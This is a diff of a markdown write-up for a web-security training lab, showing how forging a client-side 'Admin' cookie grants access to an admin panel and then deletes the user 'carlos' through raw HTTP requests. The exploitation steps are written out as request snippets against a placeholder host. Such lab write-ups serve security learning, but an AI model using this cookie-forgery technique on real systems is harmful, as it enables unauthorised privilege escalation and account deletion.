@@ -1,11 +1,12 @@
 # Lab: Admin Panel with Forgeable Cookie
 
 ## 1. Lab Description
- This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.
 
-Solve the lab by accessing the admin panel and using it to delete the user 'carlos'.
+ This lab has an admin panel at `/admin`, which identifies administrators using a forgeable cookie.
 
-You can log in to your own account using the following credentials: 'wiener:peter' 
+Solve the lab by accessing the admin panel and using it to delete the user `carlos`.
+
+You can log in to your own account using the following credentials: `wiener:peter`
 
 ---
 
@@ -39,21 +40,23 @@ Since cookies are controlled by the client, this suggests a **forgeable cookie-b
 
 ## 4. Exploitation
 
-I modified the request in Burp Suite Repeater and changed the cookie value:
+I modified the request in Burp Suite Repeater and changed the cookie value to escalate privileges.
 
-### Original Request
+### Step 1: Access admin panel
+
+Original request:
 
 ```
 Cookie: session=...; Admin=false
 ```
 
-### Modified Request
+Modified request:
 
 ```
 Cookie: session=...; Admin=true
 ```
 
-After modifying the cookie, I sent a request to the admin endpoint:
+After updating the cookie, I sent a request to the admin endpoint:
 
 ```
 GET /admin HTTP/2
@@ -61,11 +64,25 @@ Host: <target-host>
 Cookie: session=...; Admin=true
 ```
 
-The server granted access to the admin panel.
+This granted access to the admin panel.
 
 ---
 
-## 5. Execution
+### Step 2: Delete user
+
+Inside the admin panel, I performed the delete action using the following request:
+
+```
+GET /admin/delete?username=carlos HTTP/2
+Host: <target-host>
+Cookie: session=...; Admin=true
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: 
+```
+
+This request successfully deleted the user `carlos` and completed the lab.
+
+## 5. Result Execution
 
 Inside the admin panel, I located the user management interface and deleted the target user:
 
